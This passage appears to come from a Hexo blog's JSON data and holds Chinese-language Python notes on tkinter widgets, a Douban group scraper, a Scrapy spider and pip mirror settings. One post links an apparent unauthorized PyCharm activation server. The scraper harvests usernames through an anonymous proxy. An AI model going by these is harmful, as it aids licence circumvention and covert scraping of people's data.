按钮控件</td>\n<td>在程序中显示按钮。</td>\n</tr>\n<tr>\n<td>Canvas    画布控件</td>\n<td>显示图形元素如线条或文本</td>\n</tr>\n<tr>\n<td>Checkbutton    多选框控件</td>\n<td>用于在程序中提供多项选择框</td>\n</tr>\n<tr>\n<td>Entry    输入控件</td>\n<td>用于显示简单的文本内容</td>\n</tr>\n<tr>\n<td>Frame    框架控件</td>\n<td>在屏幕上显示一个矩形区域，多用来作为容器</td>\n</tr>\n<tr>\n<td>Label    标签控件</td>\n<td>可以显示文本和位图</td>\n</tr>\n<tr>\n<td>Listbox    列表框控件</td>\n<td>在Listbox窗口小部件是用来显示一个字符串列表给用户</td>\n</tr>\n<tr>\n<td>Menubutton    菜单按钮控件</td>\n<td>由于显示菜单项。</td>\n</tr>\n<tr>\n<td>Menu    菜单控件</td>\n<td>显示菜单栏,下拉菜单和弹出菜单</td>\n</tr>\n<tr>\n<td>Message    消息控件</td>\n<td>用来显示多行文本，与label比较类似</td>\n</tr>\n<tr>\n<td>Radiobutton    单选按钮控件</td>\n<td>显示一个单选的按钮状态</td>\n</tr>\n<tr>\n<td>Scale    范围控件</td>\n<td>显示一个数值刻度，为输出限定范围的数字区间</td>\n</tr>\n<tr>\n<td>Scrollbar    滚动条控件</td>\n<td>当内容超过可视化区域时使用，如列表框。.</td>\n</tr>\n<tr>\n<td>Text    文本控件</td>\n<td>用于显示多行文本</td>\n</tr>\n<tr>\n<td>Toplevel    容器控</td>\n<td>用来提供一个单独的对话框，和Frame比较类似</td>\n</tr>\n<tr>\n<td>Spinbox    输入控件与Entry类似</td>\n<td>但是可以指定输入范围值</td>\n</tr>\n<tr>\n<td>PanedWindow    PanedWindow</td>\n<td>是一个窗口布局管理的插件，可以包含一个或者多个子控件。</td>\n</tr>\n<tr>\n<td>LabelFrame    labelframe</td>\n<td>是一个简单的容器控件。常用与复杂的窗口布局。</td>\n</tr>\n<tr>\n<td>tkMessageBox</td>\n<td>用于显示你应用程序的消息框。</td>\n</tr>\n</tbody>\n</table>\n<p><a href=\"http://blog.chinaunix.net/uid-22334392-id-3597716.html\" target=\"_blank\" rel=\"noopener\">demo</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><a href=\"http://www.cnblogs.com/kaituorensheng/p/3287652.html\" target=\"_blank\" rel=\"noopener\">buju</a></p>\n<h4 id=\"定义控件\"><a href=\"#定义控件\" class=\"headerlink\" title=\"定义控件\"></a>定义控件</h4><h4 id=\"把控件放到布局中\"><a href=\"#把控件放到布局中\" class=\"headerlink\" title=\"把控件放到布局中\"></a>把控件放到布局中</h4><h4 id=\"控件事件监听\"><a href=\"#控件事件监听\" class=\"headerlink\" title=\"控件事件监听\"></a>控件事件监听</h4><h4 id=\"控件信息交互\"><a href=\"#控件信息交互\" class=\"headerlink\" title=\"控件信息交互\"></a>控件信息交互</h4><table>\n<thead>\n<tr>\n<th>控件</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Button    按钮控件</td>\n<td>在程序中显示按钮。</td>\n</tr>\n<tr>\n<td>Canvas    画布控件</td>\n<td>显示图形元素如线条或文本</td>\n</tr>\n<tr>\n<td>Checkbutton    多选框控件</td>\n<td>用于在程序中提供多项选择框</td>\n</tr>\n<tr>\n<td>Entry    输入控件</td>\n<td>用于显示简单的文本内容</td>\n</tr>\n<tr>\n<td>Frame    框架控件</td>\n<td>在屏幕上显示一个矩形区域，多用来作为容器</td>\n</tr>\n<tr>\n<td>Label    标签控件</td>\n<td>可以显示文本和位图</td>\n</tr>\n<tr>\n<td>Listbox    列表框控件</td>\n<td>在Listbox窗口小部件是用来显示一个字符串列表给用户</td>\n</tr>\n<tr>\n<td>Menubutton    菜单按钮控件</td>\n<td>由于显示菜单项。</td>\n</tr>\n<tr>\n<td>Menu    菜单控件</td>\n<td>显示菜单栏,下拉菜单和弹出菜单</td>\n</tr>\n<tr>\n<td>Message    消息控件</td>\n<td>用来显示多行文本，与label比较类似</td>\n</tr>\n<tr>\n<td>Radiobutton    单选按钮控件</td>\n<td>显示一个单选的按钮状态</td>\n</tr>\n<tr>\n<td>Scale    范围控件</td>\n<td>显示一个数值刻度，为输出限定范围的数字区间</td>\n</tr>\n<tr>\n<td>Scrollbar    滚动条控件</td>\n<td>当内容超过可视化区域时使用，如列表框。.</td>\n</tr>\n<tr>\n<td>Text    文本控件</td>\n<td>用于显示多行文本</td>\n</tr>\n<tr>\n<td>Toplevel    容器控</td>\n<td>用来提供一个单独的对话框，和Frame比较类似</td>\n</tr>\n<tr>\n<td>Spinbox    输入控件与Entry类似</td>\n<td>但是可以指定输入范围值</td>\n</tr>\n<tr>\n<td>PanedWindow    PanedWindow</td>\n<td>是一个窗口布局管理的插件，可以包含一个或者多个子控件。</td>\n</tr>\n<tr>\n<td>LabelFrame    labelframe</td>\n<td>是一个简单的容器控件。常用与复杂的窗口布局。</td>\n</tr>\n<tr>\n<td>tkMessageBox</td>\n<td>用于显示你应用程序的消息框。</td>\n</tr>\n</tbody>\n</table>\n<p><a href=\"http://blog.chinaunix.net/uid-22334392-id-3597716.html\" target=\"_blank\" rel=\"noopener\">demo</a></p>\n"},{"title":"fuckcode","date":"2018-07-10T13:09:19.000Z","_content":"- 三目运算符\n\n  为真时的结果 if 判定条件 else 为假时的结果 \n        \n        a = 1 if 5>3 else 0\n\n- print不换行\n\n        print(\"不换行\"，end = '')","source":"_posts/python/fuckcode.md","raw":"---\ntitle: fuckcode\ndate: 2018-07-10 21:09:19\ntags: python\n---\n- 三目运算符\n\n  为真时的结果 if 判定条件 else 为假时的结果 \n        \n        a = 1 if 5>3 else 0\n\n- print不换行\n\n        print(\"不换行\"，end = '')","slug":"python/fuckcode","published":1,"updated":"2018-07-10T13:10:09.954Z","_id":"cjjedmhba006d0gtjdlg49vku","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><p>三目运算符</p>\n<p>为真时的结果 if 判定条件 else 为假时的结果 </p>\n<pre><code>a = 1 if 5&gt;3 else 0\n</code></pre></li>\n<li><p>print不换行</p>\n<pre><code>print(&quot;不换行&quot;，end = &apos;&apos;)\n</code></pre></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><p>三目运算符</p>\n<p>为真时的结果 if 判定条件 else 为假时的结果 </p>\n<pre><code>a = 1 if 5&gt;3 else 0\n</code></pre></li>\n<li><p>print不换行</p>\n<pre><code>print(&quot;不换行&quot;，end = &apos;&apos;)\n</code></pre></li>\n</ul>\n"},{"title":"TypeError get() takes no keyword arguments","date":"2018-07-10T13:09:19.000Z","_content":"```\nconverted_comments.get(submission.id, default=0)\n#改成\nconverted_comments.get(submission.id, 0)","source":"_posts/python/TypeError get() takes no keyword arguments.md","raw":"---\ntitle: TypeError get() takes no keyword arguments\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\nconverted_comments.get(submission.id, default=0)\n#改成\nconverted_comments.get(submission.id, 0)","slug":"python/TypeError get() takes no keyword arguments","published":1,"updated":"2018-07-10T13:10:09.968Z","_id":"cjjedmhbb006f0gtj77uvk3nj","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>converted_comments.get(submission.id, default=0)</p>\n<p>#改成<br>converted_comments.get(submission.id, 0)</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>converted_comments.get(submission.id, default=0)</p>\n<p>#改成<br>converted_comments.get(submission.id, 0)</p>\n"},{"title":"hello","date":"2018-07-10T13:09:19.000Z","_content":"```\r\nimport tkinter.filedialog\r\nfrom tkinter import *\r\n\r\n\r\nclass App:\r\n\r\n    filed_lable = Label()\r\n    filed_input = Entry()\r\n\r\n    def __init__(self, master):\r\n\r\n        frame_top = Frame(master)\r\n        frame_top.pack()\r\n\r\n        self.button = Button(frame_top, text=\"QUIT\", fg=\"red\", command=frame_top.quit)\r\n        self.button.pack(side=LEFT)\r\n\r\n        self.hi_there = Button(frame_top, text=\"Hello\", command=self.say_hi)\r\n        self.hi_there.pack(side=LEFT)\r\n\r\n        self.filed_input = Entry(frame_top)\r\n        self.filed_input.pack()\r\n\r\n\r\n\r\n\r\n\r\n    def say_hi(self):\r\n        frame_bottom = Frame(root)\r\n        frame_bottom.pack()\r\n        print(\"---------------hello---------------\")\r\n        text = self.filed_input.get()\r\n        self.filed_input.delete(0,len(text))\r\n        self.filed_lable = Label(frame_bottom,text=text)\r\n        self.filed_lable.pack()\r\n        filename = tkinter.filedialog.askopenfilename(filetypes=[(\"任意格式\",\"*\")])\r\n\r\n\r\nroot = Tk()\r\napp = App(root)\r\n\r\nroot.mainloop()\r\nroot.destroy()  # optional; see description below\r\n","source":"_posts/python/hello.md","raw":"---\ntitle: hello\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\r\nimport tkinter.filedialog\r\nfrom tkinter import *\r\n\r\n\r\nclass App:\r\n\r\n    filed_lable = Label()\r\n    filed_input = Entry()\r\n\r\n    def __init__(self, master):\r\n\r\n        frame_top = Frame(master)\r\n        frame_top.pack()\r\n\r\n        self.button = Button(frame_top, text=\"QUIT\", fg=\"red\", command=frame_top.quit)\r\n        self.button.pack(side=LEFT)\r\n\r\n        self.hi_there = Button(frame_top, text=\"Hello\", command=self.say_hi)\r\n        self.hi_there.pack(side=LEFT)\r\n\r\n        self.filed_input = Entry(frame_top)\r\n        self.filed_input.pack()\r\n\r\n\r\n\r\n\r\n\r\n    def say_hi(self):\r\n        frame_bottom = Frame(root)\r\n        frame_bottom.pack()\r\n        print(\"---------------hello---------------\")\r\n        text = self.filed_input.get()\r\n        self.filed_input.delete(0,len(text))\r\n        self.filed_lable = Label(frame_bottom,text=text)\r\n        self.filed_lable.pack()\r\n        filename = tkinter.filedialog.askopenfilename(filetypes=[(\"任意格式\",\"*\")])\r\n\r\n\r\nroot = Tk()\r\napp = App(root)\r\n\r\nroot.mainloop()\r\nroot.destroy()  # optional; see description below\r\n","slug":"python/hello","published":1,"updated":"2018-07-10T13:10:09.955Z","_id":"cjjedmhbc006h0gtj17a430gc","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>import tkinter.filedialog<br>from tkinter import *</p>\n<p>class App:</p>\n<pre><code>filed_lable = Label()\nfiled_input = Entry()\n\ndef __init__(self, master):\n\n    frame_top = Frame(master)\n    frame_top.pack()\n\n    self.button = Button(frame_top, text=&quot;QUIT&quot;, fg=&quot;red&quot;, command=frame_top.quit)\n    self.button.pack(side=LEFT)\n\n    self.hi_there = Button(frame_top, text=&quot;Hello&quot;, command=self.say_hi)\n    self.hi_there.pack(side=LEFT)\n\n    self.filed_input = Entry(frame_top)\n    self.filed_input.pack()\n\n\n\n\n\ndef say_hi(self):\n    frame_bottom = Frame(root)\n    frame_bottom.pack()\n    print(&quot;---------------hello---------------&quot;)\n    text = self.filed_input.get()\n    self.filed_input.delete(0,len(text))\n    self.filed_lable = Label(frame_bottom,text=text)\n    self.filed_lable.pack()\n    filename = tkinter.filedialog.askopenfilename(filetypes=[(&quot;任意格式&quot;,&quot;*&quot;)])\n</code></pre><p>root = Tk()<br>app = App(root)</p>\n<p>root.mainloop()<br>root.destroy()  # optional; see description below</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>import tkinter.filedialog<br>from tkinter import *</p>\n<p>class App:</p>\n<pre><code>filed_lable = Label()\nfiled_input = Entry()\n\ndef __init__(self, master):\n\n    frame_top = Frame(master)\n    frame_top.pack()\n\n    self.button = Button(frame_top, text=&quot;QUIT&quot;, fg=&quot;red&quot;, command=frame_top.quit)\n    self.button.pack(side=LEFT)\n\n    self.hi_there = Button(frame_top, text=&quot;Hello&quot;, command=self.say_hi)\n    self.hi_there.pack(side=LEFT)\n\n    self.filed_input = Entry(frame_top)\n    self.filed_input.pack()\n\n\n\n\n\ndef say_hi(self):\n    frame_bottom = Frame(root)\n    frame_bottom.pack()\n    print(&quot;---------------hello---------------&quot;)\n    text = self.filed_input.get()\n    self.filed_input.delete(0,len(text))\n    self.filed_lable = Label(frame_bottom,text=text)\n    self.filed_lable.pack()\n    filename = tkinter.filedialog.askopenfilename(filetypes=[(&quot;任意格式&quot;,&quot;*&quot;)])\n</code></pre><p>root = Tk()<br>app = App(root)</p>\n<p>root.mainloop()<br>root.destroy()  # optional; see description below</p>\n"},{"title":"douban","date":"2018-07-10T13:09:19.000Z","_content":"```\r\n# -*- coding:utf-8 -*-\r\nimport requests\r\nimport re\r\n\r\nheader = {\r\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',\r\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\r\n    'Accept-Language': 'en-US,en;q=0.5',\r\n    'Accept-Encoding': 'gzip, deflate, br'\r\n}\r\nproxies = {\"http\": \"http://\"+'125.88.74.123:81'}\r\ndouban = 'https://www.douban.com/group/hangzhou/discussion?start='\r\nurl_rule = '<td class=\\\"title\\\">.*?<a href=\\\"(.*?)\\\" title=\\\".*?\\\" class=\\\"\\\">.*?<\\/a>.*?<\\/td>'\r\nname_rule = '<a href=\"https://www.douban.com/people/.*?/\" class=\"\">(.*?)</a>'\r\n\r\nstarts = ['0','25','50','75']\r\nfor start in starts:\r\n    index_html = requests.get(url=douban + start, headers=header, proxies=proxies)\r\n    print('结果：', index_html.status_code)\r\n    print('原因：', index_html.reason)\r\n\r\n    url_patten = re.compile(url_rule, re.S)\r\n    urls = re.findall(url_patten, index_html.text)\r\n    #print(index_html.text)\r\n    #print(urls)\r\n    for url in urls:\r\n        print('---------', url)\r\n\r\n    for toipc in urls:\r\n        topichtml = requests.get(url=toipc, headers=header,proxies = proxies)\r\n        name_patten = re.compile(name_rule, re.S)\r\n        names = re.findall(name_patten, topichtml.text)\r\n        print('>>>>>>>>', len(names))\r\n        print(names)\r\n        for name in names:\r\n            if (name=='**'):\r\n                print(name + \": \" + toipc)\r\n","source":"_posts/python/douban.md","raw":"---\ntitle: douban\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\r\n# -*- coding:utf-8 -*-\r\nimport requests\r\nimport re\r\n\r\nheader = {\r\n    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',\r\n    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',\r\n    'Accept-Language': 'en-US,en;q=0.5',\r\n    'Accept-Encoding': 'gzip, deflate, br'\r\n}\r\nproxies = {\"http\": \"http://\"+'125.88.74.123:81'}\r\ndouban = 'https://www.douban.com/group/hangzhou/discussion?start='\r\nurl_rule = '<td class=\\\"title\\\">.*?<a href=\\\"(.*?)\\\" title=\\\".*?\\\" class=\\\"\\\">.*?<\\/a>.*?<\\/td>'\r\nname_rule = '<a href=\"https://www.douban.com/people/.*?/\" class=\"\">(.*?)</a>'\r\n\r\nstarts = ['0','25','50','75']\r\nfor start in starts:\r\n    index_html = requests.get(url=douban + start, headers=header, proxies=proxies)\r\n    print('结果：', index_html.status_code)\r\n    print('原因：', index_html.reason)\r\n\r\n    url_patten = re.compile(url_rule, re.S)\r\n    urls = re.findall(url_patten, index_html.text)\r\n    #print(index_html.text)\r\n    #print(urls)\r\n    for url in urls:\r\n        print('---------', url)\r\n\r\n    for toipc in urls:\r\n        topichtml = requests.get(url=toipc, headers=header,proxies = proxies)\r\n        name_patten = re.compile(name_rule, re.S)\r\n        names = re.findall(name_patten, topichtml.text)\r\n        print('>>>>>>>>', len(names))\r\n        print(names)\r\n        for name in names:\r\n            if (name=='**'):\r\n                print(name + \": \" + toipc)\r\n","slug":"python/douban","published":1,"updated":"2018-07-10T13:10:09.953Z","_id":"cjjedmhbd006j0gtjrxtg4s67","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code></p>\n<h1 id=\"coding-utf-8\"><a href=\"#coding-utf-8\" class=\"headerlink\" title=\"-- coding:utf-8 --\"></a>-<em>- coding:utf-8 -</em>-</h1><p>import requests<br>import re</p>\n<p>header = {<br>    ‘User-Agent’: ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘en-US,en;q=0.5’,<br>    ‘Accept-Encoding’: ‘gzip, deflate, br’<br>}<br>proxies = {“http”: “http://“+’125.88.74.123:81’}<br>douban = ‘<a href=\"https://www.douban.com/group/hangzhou/discussion?start=&#39;\" target=\"_blank\" rel=\"noopener\">https://www.douban.com/group/hangzhou/discussion?start=&#39;</a><br>url_rule = ‘<td class=\"\\\"title\\\"\">.<em>?&lt;a href=\\”(.</em>?)\\” title=\\”.<em>?\\” class=\\”\\”&gt;.</em>?&lt;\\/a&gt;.<em>?&lt;\\/td&gt;’<br>name_rule = ‘&lt;a href=”<a href=\"https://www.douban.com/people/\" target=\"_blank\" rel=\"noopener\">https://www.douban.com/people/</a>.</em>?/“ class=””&gt;(.*?)‘</td></p>\n<p>starts = [‘0’,’25’,’50’,’75’]<br>for start in starts:<br>    index_html = requests.get(url=douban + start, headers=header, proxies=proxies)<br>    print(‘结果：’, index_html.status_code)<br>    print(‘原因：’, index_html.reason)</p>\n<pre><code>url_patten = re.compile(url_rule, re.S)\nurls = re.findall(url_patten, index_html.text)\n#print(index_html.text)\n#print(urls)\nfor url in urls:\n    print(&apos;---------&apos;, url)\n\nfor toipc in urls:\n    topichtml = requests.get(url=toipc, headers=header,proxies = proxies)\n    name_patten = re.compile(name_rule, re.S)\n    names = re.findall(name_patten, topichtml.text)\n    print(&apos;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&apos;, len(names))\n    print(names)\n    for name in names:\n        if (name==&apos;**&apos;):\n            print(name + &quot;: &quot; + toipc)\n</code></pre>","site":{"data":{}},"excerpt":"","more":"<p><code>`</code></p>\n<h1 id=\"coding-utf-8\"><a href=\"#coding-utf-8\" class=\"headerlink\" title=\"-- coding:utf-8 --\"></a>-<em>- coding:utf-8 -</em>-</h1><p>import requests<br>import re</p>\n<p>header = {<br>    ‘User-Agent’: ‘Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0’,<br>    ‘Accept’: ‘text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8’,<br>    ‘Accept-Language’: ‘en-US,en;q=0.5’,<br>    ‘Accept-Encoding’: ‘gzip, deflate, br’<br>}<br>proxies = {“http”: “http://“+’125.88.74.123:81’}<br>douban = ‘<a href=\"https://www.douban.com/group/hangzhou/discussion?start=&#39;\" target=\"_blank\" rel=\"noopener\">https://www.douban.com/group/hangzhou/discussion?start=&#39;</a><br>url_rule = ‘<td class=\"\\\"title\\\"\">.<em>?&lt;a href=\\”(.</em>?)\\” title=\\”.<em>?\\” class=\\”\\”&gt;.</em>?&lt;\\/a&gt;.<em>?&lt;\\/td&gt;’<br>name_rule = ‘&lt;a href=”<a href=\"https://www.douban.com/people/\" target=\"_blank\" rel=\"noopener\">https://www.douban.com/people/</a>.</em>?/“ class=””&gt;(.*?)‘</td></p>\n<p>starts = [‘0’,’25’,’50’,’75’]<br>for start in starts:<br>    index_html = requests.get(url=douban + start, headers=header, proxies=proxies)<br>    print(‘结果：’, index_html.status_code)<br>    print(‘原因：’, index_html.reason)</p>\n<pre><code>url_patten = re.compile(url_rule, re.S)\nurls = re.findall(url_patten, index_html.text)\n#print(index_html.text)\n#print(urls)\nfor url in urls:\n    print(&apos;---------&apos;, url)\n\nfor toipc in urls:\n    topichtml = requests.get(url=toipc, headers=header,proxies = proxies)\n    name_patten = re.compile(name_rule, re.S)\n    names = re.findall(name_patten, topichtml.text)\n    print(&apos;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&apos;, len(names))\n    print(names)\n    for name in names:\n        if (name==&apos;**&apos;):\n            print(name + &quot;: &quot; + toipc)\n</code></pre>"},{"title":"py","date":"2018-07-10T13:09:19.000Z","_content":"```\npip --no-cache-dir install scrapy\n\nPYCHARM激活\nhttp://idea.imsxm.com/","source":"_posts/python/py.md","raw":"---\ntitle: py\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\npip --no-cache-dir install scrapy\n\nPYCHARM激活\nhttp://idea.imsxm.com/","slug":"python/py","published":1,"updated":"2018-07-10T13:10:09.957Z","_id":"cjjedmhbe006l0gtj7rv1za08","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>pip –no-cache-dir install scrapy</p>\n<p>PYCHARM激活<br><a href=\"http://idea.imsxm.com/\" target=\"_blank\" rel=\"noopener\">http://idea.imsxm.com/</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>pip –no-cache-dir install scrapy</p>\n<p>PYCHARM激活<br><a href=\"http://idea.imsxm.com/\" target=\"_blank\" rel=\"noopener\">http://idea.imsxm.com/</a></p>\n"},{"title":"scrapy","date":"2018-07-10T13:09:19.000Z","_content":"```\nimport scrapy\n\nimport re\n\nclass mySpider(scrapy.Spider):\n    name = \"OSC-NEWS-SPIDER\"\n    start_urls = [\n        'http://blog.csdn.net/',\n    ]\n\n    def parse(self, response):\n        for quote in response.css(\"div.blog_list_wrap\"):\n            print('hello bitch')\n            yield {\n                'title': quote.css(\"dl.blog_list clearfix::text\").extract_first(),\n                #'content': quote.css(\"div.sc sc-text text-gradient wrap summary::text\").extract_first(),\n                #'tags': quote.css(\"div.tags > a.tag::text\").extract()\n            }\n\n        next_page_url = response.css(\"li.next > a::attr(href)\").extract_first()\n        if next_page_url is not None:\n            yield scrapy.Request(response.urljoin(next_page_url))\n\n\n\n\nfrom twisted.internet import reactor\nfrom scrapy.crawler import Crawler\nfrom scrapy import log, signals\nfrom scrapy.utils.project import get_project_settings\nfrom spiders.MoiveSpider import MoiveSpider\n\nspider = MoiveSpider()  #这里改为你的爬虫类名\nsettings = get_project_settings()\ncrawler = Crawler(settings)\ncrawler.signals.connect(reactor.stop, signal=signals.spider_closed)\ncrawler.configure()\ncrawler.crawl(spider)\ncrawler.start()\nlog.start()\nreactor.run()\n\n\nfrom scrapy import cmdline\n....","source":"_posts/python/scrapy.md","raw":"---\ntitle: scrapy\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\nimport scrapy\n\nimport re\n\nclass mySpider(scrapy.Spider):\n    name = \"OSC-NEWS-SPIDER\"\n    start_urls = [\n        'http://blog.csdn.net/',\n    ]\n\n    def parse(self, response):\n        for quote in response.css(\"div.blog_list_wrap\"):\n            print('hello bitch')\n            yield {\n                'title': quote.css(\"dl.blog_list clearfix::text\").extract_first(),\n                #'content': quote.css(\"div.sc sc-text text-gradient wrap summary::text\").extract_first(),\n                #'tags': quote.css(\"div.tags > a.tag::text\").extract()\n            }\n\n        next_page_url = response.css(\"li.next > a::attr(href)\").extract_first()\n        if next_page_url is not None:\n            yield scrapy.Request(response.urljoin(next_page_url))\n\n\n\n\nfrom twisted.internet import reactor\nfrom scrapy.crawler import Crawler\nfrom scrapy import log, signals\nfrom scrapy.utils.project import get_project_settings\nfrom spiders.MoiveSpider import MoiveSpider\n\nspider = MoiveSpider()  #这里改为你的爬虫类名\nsettings = get_project_settings()\ncrawler = Crawler(settings)\ncrawler.signals.connect(reactor.stop, signal=signals.spider_closed)\ncrawler.configure()\ncrawler.crawl(spider)\ncrawler.start()\nlog.start()\nreactor.run()\n\n\nfrom scrapy import cmdline\n....","slug":"python/scrapy","published":1,"updated":"2018-07-10T13:10:09.962Z","_id":"cjjedmhbe006n0gtj1jhlpy3n","comments":1,"layout":"post","photos":[],"link":"","content":"<p><code>`</code><br>import scrapy</p>\n<p>import re</p>\n<p>class mySpider(scrapy.Spider):<br>    name = “OSC-NEWS-SPIDER”<br>    start_urls = [<br>        ‘<a href=\"http://blog.csdn.net/&#39;\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/&#39;</a>,<br>    ]</p>\n<pre><code>def parse(self, response):\n    for quote in response.css(&quot;div.blog_list_wrap&quot;):\n        print(&apos;hello bitch&apos;)\n        yield {\n            &apos;title&apos;: quote.css(&quot;dl.blog_list clearfix::text&quot;).extract_first(),\n            #&apos;content&apos;: quote.css(&quot;div.sc sc-text text-gradient wrap summary::text&quot;).extract_first(),\n            #&apos;tags&apos;: quote.css(&quot;div.tags &gt; a.tag::text&quot;).extract()\n        }\n\n    next_page_url = response.css(&quot;li.next &gt; a::attr(href)&quot;).extract_first()\n    if next_page_url is not None:\n        yield scrapy.Request(response.urljoin(next_page_url))\n</code></pre><p>from twisted.internet import reactor<br>from scrapy.crawler import Crawler<br>from scrapy import log, signals<br>from scrapy.utils.project import get_project_settings<br>from spiders.MoiveSpider import MoiveSpider</p>\n<p>spider = MoiveSpider()  #这里改为你的爬虫类名<br>settings = get_project_settings()<br>crawler = Crawler(settings)<br>crawler.signals.connect(reactor.stop, signal=signals.spider_closed)<br>crawler.configure()<br>crawler.crawl(spider)<br>crawler.start()<br>log.start()<br>reactor.run()</p>\n<p>from scrapy import cmdline<br>….</p>\n","site":{"data":{}},"excerpt":"","more":"<p><code>`</code><br>import scrapy</p>\n<p>import re</p>\n<p>class mySpider(scrapy.Spider):<br>    name = “OSC-NEWS-SPIDER”<br>    start_urls = [<br>        ‘<a href=\"http://blog.csdn.net/&#39;\" target=\"_blank\" rel=\"noopener\">http://blog.csdn.net/&#39;</a>,<br>    ]</p>\n<pre><code>def parse(self, response):\n    for quote in response.css(&quot;div.blog_list_wrap&quot;):\n        print(&apos;hello bitch&apos;)\n        yield {\n            &apos;title&apos;: quote.css(&quot;dl.blog_list clearfix::text&quot;).extract_first(),\n            #&apos;content&apos;: quote.css(&quot;div.sc sc-text text-gradient wrap summary::text&quot;).extract_first(),\n            #&apos;tags&apos;: quote.css(&quot;div.tags &gt; a.tag::text&quot;).extract()\n        }\n\n    next_page_url = response.css(&quot;li.next &gt; a::attr(href)&quot;).extract_first()\n    if next_page_url is not None:\n        yield scrapy.Request(response.urljoin(next_page_url))\n</code></pre><p>from twisted.internet import reactor<br>from scrapy.crawler import Crawler<br>from scrapy import log, signals<br>from scrapy.utils.project import get_project_settings<br>from spiders.MoiveSpider import MoiveSpider</p>\n<p>spider = MoiveSpider()  #这里改为你的爬虫类名<br>settings = get_project_settings()<br>crawler = Crawler(settings)<br>crawler.signals.connect(reactor.stop, signal=signals.spider_closed)<br>crawler.configure()<br>crawler.crawl(spider)<br>crawler.start()<br>log.start()<br>reactor.run()</p>\n<p>from scrapy import cmdline<br>….</p>\n"},{"title":"pip数据源设置","date":"2018-07-10T13:09:19.000Z","_content":"#### 直接使用\r\n    pip install -i https://pypi.douban.com/simple/ 【包名】\r\n    \r\n    \r\n    \r\n#### pip源配置文件可以放置的位置\r\n \r\n\r\n##### Linux/Unix:\r\n\r\n/etc/pip.conf\r\n\r\n~/.pip/pip.conf\r\n\r\n~/.config/pip/pip.conf\r\n\r\n \r\n\r\n##### Mac OSX:\r\n\r\n~/Library/Application Support/pip/pip.conf\r\n\r\n~/.pip/pip.conf\r\n\r\n/Library/Application Support/pip/pip.conf\r\n\r\n \r\n\r\n##### Windows:\r\n\r\n%APPDATA%\\pip\\pip.ini\r\n\r\n%HOME%\\pip\\pip.ini\r\n\r\nC:\\Documents and Settings\\All Users\\Application Data\\PyPA\\pip\\pip.conf (Windows XP)\r\n\r\nC:\\ProgramData\\PyPA\\pip\\pip.conf (Windows 7及以后)\r\n\r\n\r\n \r\n\r\n#### 配置如下：\r\n\r\n \r\n\r\n```\r\n[global]\r\nindex-url = https://pypi.douban.com/simple #豆瓣源，可以换成其他的源\r\ntrusted-host = pypi.douban.com            #添加豆瓣源为可信主机，要不然可能报错\r\ndisable-pip-version-check = true          #取消pip版本检查，排除每次都报最新的pip\r\ntimeout = 120","source":"_posts/python/pip数据源设置.md","raw":"---\ntitle: pip数据源设置\ndate: 2018-07-10 21:09:19\ntags: python\n---\n#### 直接使用\r\n    pip install -i https://pypi.douban.com/simple/ 【包名】\r\n    \r\n    \r\n    \r\n#### pip源配置文件可以放置的位置\r\n \r\n\r\n##### Linux/Unix:\r\n\r\n/etc/pip.conf\r\n\r\n~/.pip/pip.conf\r\n\r\n~/.config/pip/pip.conf\r\n\r\n \r\n\r\n##### Mac OSX:\r\n\r\n~/Library/Application Support/pip/pip.conf\r\n\r\n~/.pip/pip.conf\r\n\r\n/Library/Application Support/pip/pip.conf\r\n\r\n \r\n\r\n##### Windows:\r\n\r\n%APPDATA%\\pip\\pip.ini\r\n\r\n%HOME%\\pip\\pip.ini\r\n\r\nC:\\Documents and Settings\\All Users\\Application Data\\PyPA\\pip\\pip.conf (Windows XP)\r\n\r\nC:\\ProgramData\\PyPA\\pip\\pip.conf (Windows 7及以后)\r\n\r\n\r\n \r\n\r\n#### 配置如下：\r\n\r\n \r\n\r\n```\r\n[global]\r\nindex-url = https://pypi.douban.com/simple #豆瓣源，可以换成其他的源\r\ntrusted-host = pypi.douban.com            #添加豆瓣源为可信主机，要不然可能报错\r\ndisable-pip-version-check = true          #取消pip版本检查，排除每次都报最新的pip\r\ntimeout = 120","slug":"python/pip数据源设置","published":1,"updated":"2018-07-10T13:10:09.957Z","_id":"cjjedmhbg006p0gtjdamymznv","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"直接使用\"><a href=\"#直接使用\" class=\"headerlink\" title=\"直接使用\"></a>直接使用</h4><pre><code>pip install -i https://pypi.douban.com/simple/ 【包名】\n</code></pre><h4 id=\"pip源配置文件可以放置的位置\"><a href=\"#pip源配置文件可以放置的位置\" class=\"headerlink\" title=\"pip源配置文件可以放置的位置\"></a>pip源配置文件可以放置的位置</h4><h5 